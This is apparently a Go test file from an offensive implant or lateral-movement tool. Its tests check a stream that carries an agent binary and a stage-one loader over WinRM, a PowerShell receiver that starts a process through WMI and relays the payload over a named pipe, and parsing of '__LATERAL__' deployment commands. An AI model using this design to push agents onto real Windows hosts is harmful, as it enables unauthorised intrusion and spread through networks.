package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func independentTransfer(t *testing.T, agent []byte) (*winrmTransfer, []byte) {
	t.Helper()
	base, err := prepareWinRMTransferFromBytes(agent)
	if err != nil {
		t.Fatalf("prepare base transfer: %v", err)
	}
	secondary := []byte(wmiLoaderScript(wmiLoaderPipeName("srv-independent-001"), "srv-independent-001", nil, base))
	transfer, err := prepareWinRMIndependentTransfer(agent, secondary)
	if err != nil {
		t.Fatalf("prepare independent transfer: %v", err)
	}
	return transfer, secondary
}

// The independent stream must preserve the classic framing after the
// length-prefixed secondary script: prefix + script + loader + artifact.
func TestPrepareWinRMIndependentTransfer(t *testing.T) {
	agent := []byte("MZ independent artifact bytes")
	transfer, secondary := independentTransfer(t, agent)
	if transfer.scriptSize != int64(len(secondary)) {
		t.Fatalf("secondary script size %d must match %d", transfer.scriptSize, len(secondary))
	}
	got := make([]byte, transfer.size)
	if _, err := io.ReadFull(transfer.source, got); err != nil {
		t.Fatalf("read the independent stream: %v", err)
	}
	prefix := binary.LittleEndian.Uint32(got[:4])
	if prefix != uint32(len(secondary)) {
		t.Fatalf("length prefix %d must match the secondary script length", prefix)
	}
	rest := got[4:]
	if !bytes.Equal(rest[:len(secondary)], secondary) {
		t.Fatal("the secondary script must follow its length prefix")
	}
	rest = rest[len(secondary):]
	if !bytes.Equal(rest[:transfer.loaderSize], []byte(winrmStage1CSharp)) {
		t.Fatal("the loader half must follow the secondary script")
	}
	if !bytes.Equal(rest[transfer.loaderSize:], agent) {
		t.Fatal("the artifact half must close the stream")
	}
	if len(rest) != int(transfer.loaderSize+transfer.binarySize) {
		t.Fatal("the classic framing sizes must be unchanged")
	}
	for _, secondary := range []string{"", strings.Repeat("x", winrmIndependentReceiverScriptLimit+1)} {
		if _, err := prepareWinRMIndependentTransfer(agent, []byte(secondary)); err == nil {
			t.Fatalf("secondary script of length %d must be rejected", len(secondary))
		}
	}
}

// The shell receiver drives the whole independence transition; its content
// is the contract, and it must stay below the WinRS command-line limit after
// encoding.
func TestWinrmIndependentScriptComposition(t *testing.T) {
	agent := []byte("MZ independent artifact bytes")
	transfer, _ := independentTransfer(t, agent)
	script := winrmIndependentScript("srv-independent-001", transfer)
	if !strings.Contains(script, "Invoke-CimMethod -ClassName Win32_Process -MethodName Create") {
		t.Fatal("the shell receiver must create the independent host through local WMI")
	}
	if !strings.Contains(script, winrmPowerShellLiteral(wmiLoaderPipeName("srv-independent-001"))) {
		t.Fatal("the shell receiver must connect the independent host's session pipe")
	}
	if !strings.Contains(script, "NamedPipeClientStream") {
		t.Fatal("the shell receiver must relay the payload over a local pipe client")
	}
	if !strings.Contains(script, "loader SHA256 mismatch") || !strings.Contains(script, "agent SHA256 mismatch") {
		t.Fatal("the shell receiver must verify both halves before relaying")
	}
	if !strings.Contains(script, winrmPowerShellLiteral(winrmLoaderReadyMarker)) {
		t.Fatal("the shell receiver must gate its stdout marker on the independent host's readiness")
	}
	if strings.Contains(script, "`") {
		t.Fatal("the script must stay compatible with a Go raw string")
	}
	command := winrmReceiverCommandPath + " " + strings.Join(winrmIndependentReceiverArguments(script), " ")
	if len(command) > 8191 {
		t.Fatalf("the independent receiver command must stay below the WinRS limit: %d", len(command))
	}
	if len(command) <= len(winrmStage1CSharp)/2 {
		t.Fatalf("unexpectedly short command: %d", len(command))
	}
}

// The generated independent receiver must parse as Windows PowerShell 5.1:
// a syntax error would leave the source waiting on a shell whose receiver
// died before any marker. Parsing without executing stays portable.
func TestWinrmIndependentScriptParses(t *testing.T) {
	powershell := stage1Powershell(t)
	agent := []byte("MZ independent artifact bytes")
	transfer, _ := independentTransfer(t, agent)
	script := winrmIndependentScript("srv-independent-001", transfer)
	path := filepath.Join(t.TempDir(), "independent-receiver.ps1")
	if err := os.WriteFile(path, []byte(script), 0600); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	command := exec.CommandContext(ctx, powershell, "-NoLogo", "-NoProfile", "-NonInteractive", "-Command",
		`$e=$null;`+
			`[System.Management.Automation.Language.Parser]::ParseFile('`+path+`',[ref]$null,[ref]$e)|Out-Null;`+
			`if($e.Count){$e|ForEach-Object{$_.Message};exit 1}else{'Parse OK'}`)
	output, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("the independent receiver script must parse: %v: %s", err, output)
	}
	if !strings.Contains(string(output), "Parse OK") {
		t.Fatalf("unexpected parser output: %s", output)
	}
}

// The independence chain is only valid for the WinRM loader; every other
// combination must fail closed at parsing.
func TestParseLateralIndependentLifetime(t *testing.T) {
	digest := strings.Repeat("a", 64)
	base := `"host":"ws01","stage":"0123456789abcdef0123456789abcdef","payload_sha256":"` + digest + `"`
	for wire, https := range map[string]bool{
		"winrm_loader_independent":                false,
		"winrm_https_loader_independent":          true,
		"winrm_https_insecure_loader_independent": true,
	} {
		body := `{"method":"` + wire + `",` + base
		if https {
			body += `,"https":true`
			if wire == "winrm_https_insecure_loader_independent" {
				body += `,"insecure":true`
			}
		}
		payload, err := parseLateralPayload("__LATERAL__\n" + body + "}")
		if err != nil {
			t.Fatalf("%s must parse: %v", wire, err)
		}
		if payload.Method != "winrm" || !payload.loaderDeploy || !payload.independentLifetime {
			t.Fatalf("%s normalized to %#v", wire, payload)
		}
		if payload.HTTPS != https {
			t.Fatalf("%s https must be %v", wire, https)
		}
	}
	for _, invalid := range []string{
		`{"method":"wmiexec_loader_independent",` + base + `}`,
		`{"method":"winrm_loader_independent","host":"ws01","payload_sha256":"` + digest + `"}`,
		`{"method":"winrm_loader_independent",` + base + `,"https":true}`,
	} {
		if _, err := parseLateralPayload("__LATERAL__\n" + invalid); err == nil {
			t.Fatalf("invalid independent payload must be rejected: %s", invalid)
		}
	}
}
